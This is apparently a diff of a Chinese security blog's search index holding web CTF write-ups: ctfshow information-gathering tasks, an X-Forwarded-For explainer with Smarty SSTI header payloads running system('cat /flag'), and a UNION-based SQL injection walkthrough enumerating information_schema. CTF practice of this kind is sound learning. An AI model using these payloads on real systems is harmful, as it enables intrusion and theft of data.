+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDGDCCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
+<h2 id="2-12网站信息查看"><a href="#2-12网站信息查看" class="headerlink" title="2.12网站信息查看"></a>2.12网站信息查看</h2><p>有时候网站上的公开信息，就是管理员常用密码</p>
+<p>查看robots.txt文件，紧接着再访问admin登录，用户名admin。密码：在页面的最下方</p>
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDGDDCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
+<p>密码就在页面下方</p>
+<h2 id="2-13技术文档敏感信息"><a href="#2-13技术文档敏感信息" class="headerlink" title="2.13技术文档敏感信息"></a>2.13技术文档敏感信息</h2><p>技术文档里面不要出现敏感信息，部署到生产环境后及时修改默认密码</p>
+<p>根据题目提示 技术文档 在页面下面发现 document 下载发现里面存在后台地址和用户名密码登录成功获 得flag</p>
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDGDECPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
+<p>登录即可得到flag，但是网站打不开登录</p>
+<h2 id="2-14泄露重要-editor-的信息"><a href="#2-14泄露重要-editor-的信息" class="headerlink" title="2.14泄露重要(editor)的信息"></a>2.14泄露重要(editor)的信息</h2><p>有时候源码里面就能不经意间泄露重要(editor)的信息,默认配置害死人</p>
+<p>根据提示 泄露重要(editor)的信息 直接在url后面添加/editor 然后查看flag路径并且访问</p>
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDGDFCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
+<p>url后面添加/editor ，再寻找上传文件的按钮，看到var再进一步搜索，最后再url后面加上nothinghere/fl000g.txt</p>
+<h2 id="2-15公开信息泄露"><a href="#2-15公开信息泄露" class="headerlink" title="2.15公开信息泄露"></a>2.15公开信息泄露</h2><p>公开的信息比如邮箱，可能造成信息泄露，产生严重后果</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">题目提示：访问/admin页面 发现有一个忘记密码操作，需要输入地址 在主页面下面看到QQ邮箱，通过QQ号查询邮箱，是西安的 修改密码成功，用户名 admin 登录成功获得flag</span><br></pre></td></tr></table></figure>
+
+<p>首先需要admin访问，然后选择忘记密码，而密保城市是西安，输入之后直接修改密码，重新登录就可以查看flag。</p>
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDGDGCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
+<h2 id="2-16考察PHP探针"><a href="#2-16考察PHP探针" class="headerlink" title="2.16考察PHP探针"></a>2.16考察PHP探针</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">探针php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡 流量、系统负载、服务器时间等信息。</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDGDHCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
+<p>对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露</p>
+<p><strong>解题过程：url后缀名添加/tz.php 版本是雅黑PHP探针，然后查看phpinfo搜索flag</strong></p>
+<h2 id="2-17查找到ctfer-com的真实IP"><a href="#2-17查找到ctfer-com的真实IP" class="headerlink" title="2.17查找到ctfer.com的真实IP"></a>2.17查找到ctfer.com的真实IP</h2><p>透过重重缓存，查找到ctfer.com的真实IP，提交</p>
+<p>直接ping <a href="http://www.ctfshow.com/">www.ctfshow.com</a> 获得flag</p>
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDGDJCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
+<h2 id="2-18查看js文件，查看flag的条件"><a href="#2-18查看js文件，查看flag的条件" class="headerlink" title="2.18查看js文件，查看flag的条件"></a>2.18查看js文件，查看flag的条件</h2><p>首先查看源代码，接着进入js查看文件</p>
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDHDACPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
+<p>利用谐音访问110.php</p>
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDHDBCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
+<h2 id="2-19密钥前端位置盗取"><a href="#2-19密钥前端位置盗取" class="headerlink" title="2.19密钥前端位置盗取"></a>2.19密钥前端位置盗取</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">密钥什么的，就不要放在前端了</span><br></pre></td></tr></table></figure>
+
+<p>端查看源代码，post提交用户名密码</p>
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDHDCCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
+<h2 id="2-20mdb文件"><a href="#2-20mdb文件" class="headerlink" title="2.20mdb文件"></a>2.20mdb文件</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mdb文件是早期asp+access构架的数据库文件</span><br><span class="line"></span><br><span class="line"> 直接查看url路径添加/db/db.mdb</span><br><span class="line"></span><br><span class="line">下载后直接打开，搜索得到flag</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDHDDCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
+]]></content>
+      <categories>
+        <category>web ctf</category>
+      </categories>
+      <tags>
+        <tag>信息收集</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>文件包含</title>
     <url>/p/31915a1e.html</url>
     <content><![CDATA[<h1 id="csdn博客，web教学文件包含"><a href="#csdn博客，web教学文件包含" class="headerlink" title="csdn博客，web教学文件包含"></a>csdn博客，web教学文件包含</h1><p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDEDDCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
@@ -878,6 +878,61 @@
       </categories>
       <tags>
         <tag>文件包含</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>浅析一下XFF漏洞</title>
+    <url>/p/ff295fab.html</url>
+    <content><![CDATA[<p>菜狗记录，如有错误，请见谅</p>
+<h2 id="XFF漏洞浅析"><a href="#XFF漏洞浅析" class="headerlink" title="XFF漏洞浅析"></a>XFF漏洞浅析</h2><p>X-Forwarded-for：简称XFF，它代表客户端，也就是HTTP请求的真实IP，只有在通过了HTTP代理<br> 或者负载均衡器时才会添加该项。</p>
+<h3 id="如何获取客户端IP"><a href="#如何获取客户端IP" class="headerlink" title="如何获取客户端IP"></a>如何获取客户端IP</h3><p>​    在Java中，获取客户端IP最直接的方式就是使用request.getRemoteAddr()。在中间没有代理的情况下，这是最简单有效的方式。</p>
+<p>​    但是目前互联网Web应用很少会将应用服务器直接对外提供服务，一般都会有一层Nginx做反向代理和负载均衡，有的甚至可能有多层代理。在有反向代理的情况下，直接使用request.getRemoteAddr()获取到的IP地址是Nginx所在服务器的IP地址，而不是客户端的IP。</p>
+<blockquote>
+<p>HTTP协议是基于TCP协议的，由于request.getRemoteAddr()获取到的是TCP层直接连接的客户端的IP，对于Web应用服务器来说直接连接它的客户端实际上是Nginx，也就是TCP层是拿不到真实客户端的IP。</p>
+</blockquote>
+<h3 id="XFF字段"><a href="#XFF字段" class="headerlink" title="XFF字段"></a>XFF字段</h3><p>​    XFF(X-FORWARDED-FOR)是http的拓展头部，作用是使Web服务器获取访问用户的IP真实地址（可伪造）。由于很多用户通过代理服务器进行访问，服务器只能获取代理服务器的IP地址，而xff的作用在于记录用户的真实IP，以及代理服务器的IP。为了解决上面的问题，很多HTTP代理会在HTTP协议头中添加X-Forwarded-For头，用来追踪请求的来源。</p>
+<p><strong>格式：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For: 本机IP, 代理1IP, 代理2IP, 代理3IP</span><br></pre></td></tr></table></figure>
+
+<h3 id="XFF头ip追加原理"><a href="#XFF头ip追加原理" class="headerlink" title="XFF头ip追加原理"></a>XFF头ip追加原理</h3><p>总结来说就是添加的是请求来源的IP地址，在 <code>第一个代理处</code> 添加 <code>最原始的ip地址</code> ，在 <code>第二个代理处</code>添加 <code>第一个代理的ip地址</code>… 这样的错位的关系。一般的客户端（例如浏览器）发送HTTP请求是没有X-Forwarded-For头的，当请求到达第一个代理服务器时，代理服务器会加上X-Forwarded-For请求头，并将值设为客户端的IP地址（最左边第一个值）</p>
+<p>下面看一到相关的题关于XFF的</p>
+<p>另外还有关于ssti注入的，自行了解一下，还挺多知识点的</p>
+<p><a href="https://www.cnblogs.com/bmjoker/p/13508538.html">https://www.cnblogs.com/bmjoker/p/13508538.html</a></p>
+<p><a href="https://blog.csdn.net/huangyongkang666/article/details/123628875">https://blog.csdn.net/huangyongkang666/article/details/123628875</a></p>
+<h3 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h3><p>打开题目发现这些东西，有个ip显示的</p>
+<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/202304152218737.png" alt="image-20230415221803105"></p>
+<p>抓包看看吧，窃取了IP，考虑是不是XFF或Client-IP这两个header，最后发现是ssti模板注入</p>
+<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/202304152218970.png" alt="image-20230415221856890"></p>
+<p>看来wp发现是smart注入，Smarty是一个PHP的模板引擎，提供让程序逻辑与页面显示（HTML/CSS）代码分离的功能。学一下命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;if phpinfo()&#125;&#123;/if&#125;</span><br><span class="line">&#123;if readfile(‘文件路劲’)&#125;&#123;/if&#125;</span><br><span class="line">&#123;if show_source(‘文件路径’)&#125;&#123;/if&#125;</span><br><span class="line">&#123;if passthru(‘操作命令’)&#125;&#123;/if&#125;</span><br><span class="line">&#123;if system(‘操作命令’)&#125;&#123;/if&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在burp里面操作一下，经过测试发现Client-ip 和xff都是可以修改的</p>
+<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/202304152226994.png" alt="image-20230415222633895"></p>
+<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304152226111.png" alt="image-20230415222656010"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">client-ip:&#123;system(&#x27;ls&#x27;)&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-Forwarded-for:&#123;&#123;system(&#x27;ls&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304152228794.png" alt="image-20230415222849686"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">client-ip:&#123;system(&#x27;cat /flag&#x27;)&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-Forwarded-for:&#123;&#123;system(&#x27;cat /flag&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/202304152230026.png" alt="image-20230415223024961"></p>
+<p>伪造方式一下两种都可以</p>
+<p>1：通过hackbar插件x-forwarded-for直接改造</p>
+<p>2：用burp抓包修改（ps:referer也可以修改，HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理。）</p>
+<p>另外XFF sql注入还需要学习一下</p>
+<p>参考文章：</p>
+<p><a href="https://blog.51cto.com/u_14230175/5928139">https://blog.51cto.com/u_14230175/5928139</a></p>
+<p><a href="https://www.cnblogs.com/02SWD/p/13256385.html">https://www.cnblogs.com/02SWD/p/13256385.html</a></p>
+<p><a href="https://blog.csdn.net/m0_55109452/article/details/117474173">https://blog.csdn.net/m0_55109452/article/details/117474173</a></p>
+]]></content>
+      <categories>
+        <category>web ctf</category>
+      </categories>
+      <tags>
+        <tag>SSTI+XFF</tag>
       </tags>
   </entry>
   <entry>
@@ -1375,6 +1430,64 @@
       </tags>
   </entry>
   <entry>
+    <title>随意刷题03</title>
+    <url>/p/f3969ae7.html</url>
+    <content><![CDATA[<h2 id="Life-on-Mars"><a href="#Life-on-Mars" class="headerlink" title="Life on Mars"></a>Life on Mars</h2><p>这道题目一打开发现挺复杂的，扫描一下这个网站，没找到啥可疑之处，卡住了，瞎搞一番没有出来，试试的心态抓个包看看</p>
+<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304181957816.png" alt="image-20230418195655737"></p>
+<p>再换其他的页面看看</p>
+<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304181958654.png" alt="image-20230418195800627"></p>
+<p>可以想到应该再这里做文章了，没想到sql，看了wp之后才知道，而且这个sql还不是很难，很多东西都没有过滤，基本的语句就可以搞定</p>
+<p>这里是用了主要联合查询</p>
+<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304182019283.png" alt="image-20230418201943256"></p>
+<p>这里面的都可以查询，但是需要注意的是名称都改小写了，而且单词之间加了个_</p>
+<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304182020896.png" alt="image-20230418202040724"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/query?search=hesperia_planum</span><br></pre></td></tr></table></figure>
+
+<p>联合查询一下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/query?search=hesperia_planum union select 1,2,3</span><br></pre></td></tr></table></figure>
+
+<p>返回2</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span>query?<span class="keyword">search</span><span class="operator">=</span>hesperia_planum <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304182023426.png" alt="image-20230418202324243"></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>查一下库：</span><br><span class="line"><span class="operator">/</span>query?<span class="keyword">search</span><span class="operator">=</span>hesperia_planum <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database()</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>需要根据表的字段而定,也就是说当您进行查询时,语句的字段数必须保持和指定表中的字段数相同,不能增加或减少,否则将会出现报错告示。</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304182024050.png" alt="image-20230418202458025"></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">query?<span class="keyword">search</span><span class="operator">=</span>hesperia_planum <span class="keyword">union</span> <span class="keyword">select</span> database(),<span class="keyword">user</span>()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304182031231.png" alt="image-20230418203149196"></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>查表：</span><br><span class="line"><span class="operator">/</span>query?<span class="keyword">search</span><span class="operator">=</span>amazonis_planitia <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;aliens&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304182059382.png" alt="image-20230418204730031"></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>查询一下表的字段：</span><br><span class="line"><span class="operator">/</span>query?<span class="keyword">search</span><span class="operator">=</span>amazonis_planitia <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;amazonis_planitia&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304182048708.png" alt="image-20230418204842681"></p>
+<p>试试查一下里面的东西，发现没flag</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span>query?<span class="keyword">search</span><span class="operator">=</span>amazonis_planitia <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(id) <span class="keyword">from</span> amazonis_planitia</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span>query?<span class="keyword">search</span><span class="operator">=</span>amazonis_planitia <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(name) <span class="keyword">from</span> amazonis_planitia</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span>query?<span class="keyword">search</span><span class="operator">=</span>amazonis_planitia <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(description) <span class="keyword">from</span> amazonis_planitia</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304182050580.png" alt="image-20230418205008546"></p>
+<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304182050742.png" alt="image-20230418205028698"></p>
+<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304182050692.png" alt="image-20230418205044641"></p>
+<p>后来查了一下，发现数据库差错了…………</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/query?search=amazonis_planitia union select database(),group_concat(schema_name) from information_schema.schemata</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304182059557.png" alt="image-20230418205905532"></p>
+<p>重复以上步骤即可，选择alien_code这个库</p>
+<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304182100103.png" alt="image-20230418210034076"></p>
+<p><strong>表名为code</strong></p>
+<p><strong>字段也为code</strong></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span>query?<span class="keyword">search</span><span class="operator">=</span>hesperia_planum <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(code) <span class="keyword">from</span> alien_code.code</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>这里注意因为不是当前的数据库，表名前面需要加数据库的前缀</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304182104348.png" alt="image-20230418210416319"></p>
+<p>参考：<a href="https://blog.csdn.net/m0_62905261/article/details/126097708">https://blog.csdn.net/m0_62905261/article/details/126097708</a></p>
+<p>参考另外一个wp用sqlmap也能查出一些东西</p>
+<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304182135908.png"></p>
+]]></content>
+      <categories>
+        <category>web ctf</category>
+      </categories>
+  </entry>
+  <entry>
     <title>随意刷题04</title>
     <url>/p/6df20f44.html</url>
     <content><![CDATA[<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>感觉得回顾一下这个知识，学会基本的构造pop链，以前本就不太熟，浑水摸鱼过去，得学学，原理的那些可以看一下网上的</p>
@@ -1492,64 +1605,6 @@
 <p><a href="https://blog.csdn.net/weixin_45841815/article/details/119934050">参考文章1</a> <a href="https://blog.csdn.net/qq_54929891/article/details/123362853?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1-123362853-blog-124291588.235%5Ev31%5Epc_relevant_default_base3&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1-123362853-blog-124291588.235%5Ev31%5Epc_relevant_default_base3&utm_relevant_index=2">参考文章2</a> <a href="https://blog.csdn.net/m0_51326092/article/details/119003596?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-0-119003596-blog-124644325.235%5Ev31%5Epc_relevant_default_base3&spm=1001.2101.3001.4242.1&utm_relevant_index=3">参考文章3：可以看出构造的原理</a> <a href="https://www.cnblogs.com/h3zh1/p/12732336.html">参考文章4</a></p>
 <p>不得不说从都到尾梳理一下可以很好回顾，下面再看看原理，之后再看看原生类反序列，也是比较常见的</p>
 <p>这个是比较经典了：<a href="https://www.anquanke.com/post/id/238482#h3-8">安全客</a> <a href="https://www.secpulse.com/archives/165222.html">合天的反序列化逃逸详解</a></p>
-]]></content>
-      <categories>
-        <category>web ctf</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>随意刷题03</title>
-    <url>/p/f3969ae7.html</url>
-    <content><![CDATA[<h2 id="Life-on-Mars"><a href="#Life-on-Mars" class="headerlink" title="Life on Mars"></a>Life on Mars</h2><p>这道题目一打开发现挺复杂的，扫描一下这个网站，没找到啥可疑之处，卡住了，瞎搞一番没有出来，试试的心态抓个包看看</p>
-<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304181957816.png" alt="image-20230418195655737"></p>
-<p>再换其他的页面看看</p>
-<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304181958654.png" alt="image-20230418195800627"></p>
-<p>可以想到应该再这里做文章了，没想到sql，看了wp之后才知道，而且这个sql还不是很难，很多东西都没有过滤，基本的语句就可以搞定</p>
-<p>这里是用了主要联合查询</p>
-<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304182019283.png" alt="image-20230418201943256"></p>
-<p>这里面的都可以查询，但是需要注意的是名称都改小写了，而且单词之间加了个_</p>
-<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304182020896.png" alt="image-20230418202040724"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/query?search=hesperia_planum</span><br></pre></td></tr></table></figure>
-
-<p>联合查询一下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/query?search=hesperia_planum union select 1,2,3</span><br></pre></td></tr></table></figure>
-
-<p>返回2</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span>query?<span class="keyword">search</span><span class="operator">=</span>hesperia_planum <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304182023426.png" alt="image-20230418202324243"></p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>查一下库：</span><br><span class="line"><span class="operator">/</span>query?<span class="keyword">search</span><span class="operator">=</span>hesperia_planum <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database()</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>需要根据表的字段而定,也就是说当您进行查询时,语句的字段数必须保持和指定表中的字段数相同,不能增加或减少,否则将会出现报错告示。</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304182024050.png" alt="image-20230418202458025"></p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">query?<span class="keyword">search</span><span class="operator">=</span>hesperia_planum <span class="keyword">union</span> <span class="keyword">select</span> database(),<span class="keyword">user</span>()</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304182031231.png" alt="image-20230418203149196"></p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>查表：</span><br><span class="line"><span class="operator">/</span>query?<span class="keyword">search</span><span class="operator">=</span>amazonis_planitia <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;aliens&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304182059382.png" alt="image-20230418204730031"></p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>查询一下表的字段：</span><br><span class="line"><span class="operator">/</span>query?<span class="keyword">search</span><span class="operator">=</span>amazonis_planitia <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;amazonis_planitia&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304182048708.png" alt="image-20230418204842681"></p>
-<p>试试查一下里面的东西，发现没flag</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span>query?<span class="keyword">search</span><span class="operator">=</span>amazonis_planitia <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(id) <span class="keyword">from</span> amazonis_planitia</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span>query?<span class="keyword">search</span><span class="operator">=</span>amazonis_planitia <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(name) <span class="keyword">from</span> amazonis_planitia</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span>query?<span class="keyword">search</span><span class="operator">=</span>amazonis_planitia <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(description) <span class="keyword">from</span> amazonis_planitia</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304182050580.png" alt="image-20230418205008546"></p>
-<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304182050742.png" alt="image-20230418205028698"></p>
-<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304182050692.png" alt="image-20230418205044641"></p>
-<p>后来查了一下，发现数据库差错了…………</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/query?search=amazonis_planitia union select database(),group_concat(schema_name) from information_schema.schemata</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304182059557.png" alt="image-20230418205905532"></p>
-<p>重复以上步骤即可，选择alien_code这个库</p>
-<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304182100103.png" alt="image-20230418210034076"></p>
-<p><strong>表名为code</strong></p>
-<p><strong>字段也为code</strong></p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span>query?<span class="keyword">search</span><span class="operator">=</span>hesperia_planum <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(code) <span class="keyword">from</span> alien_code.code</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>这里注意因为不是当前的数据库，表名前面需要加数据库的前缀</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304182104348.png" alt="image-20230418210416319"></p>
-<p>参考：<a href="https://blog.csdn.net/m0_62905261/article/details/126097708">https://blog.csdn.net/m0_62905261/article/details/126097708</a></p>
-<p>参考另外一个wp用sqlmap也能查出一些东西</p>
-<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304182135908.png"></p>
 ]]></content>
       <categories>
         <category>web ctf</category>
